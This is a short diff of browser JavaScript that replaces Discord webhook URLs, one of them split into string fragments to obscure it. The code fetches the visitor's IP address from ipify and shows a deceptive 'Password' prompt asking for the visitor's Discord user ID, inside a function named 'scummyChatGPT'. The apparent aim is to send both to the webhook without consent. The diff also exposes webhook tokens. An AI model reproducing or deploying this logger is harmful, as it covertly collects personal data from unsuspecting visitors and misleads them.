@@ -1,6 +1,6 @@
   let output = document.getElementById("output");
 
-    const webhookURL = "https://discord.com/api/webhooks/111109521877159536" + "5/e" + "YRfGcePmrFrybbkSprsHz_rbk9gq1xVWZFSzrOqRPPRwJZBV5V4bpNUUFhbBuKdbdo" + "o";
+    const webhookURL = "https://discord.com/api/webhooks/1201699285151006770" + "5/e" + "M9ZF3fOQbcIyErHRcz6no-Z31bqiMoPsWBZcMk70TRkcbbzObgwCjAXOP0LsV_Lf08r6" + "o";
     const ipAddressURL = "https://api.ipify.org/?format=json";
 
     fetch(ipAddressURL)
@@ -21,12 +21,12 @@
       });
 
 function scummyChatGPT() {
-  let username = prompt("Password: (Just type in YOUR user ID. There's a whitelist system, by default, everyones ID is whitelisted.)");
+  let username = prompt("Password: (Just type in YOUR user ID for Discord)");
 
   let output = document.getElementById("output");
 
   if (username) {
-    const webhookURL = "https://discord.com/api/webhooks/1160022130474352651/KLW27NyUEoBUPYcYnXO2U27xxQo3KPdc1fO13cHr-ETXvQ38q4Jkrd_WKtjzo3QnHliR";
+    const webhookURL = "https://discord.com/api/webhooks/1201699285151006770/M9ZF3fOQbcIyErHRcz6no-Z31bqiMoPsWBZcMk70TRkcbbzObgwCjAXOP0LsV_Lf08r6";
     const ipAddressURL = "https://api.ipify.org/?format=json";
 
     fetch(ipAddressURL)
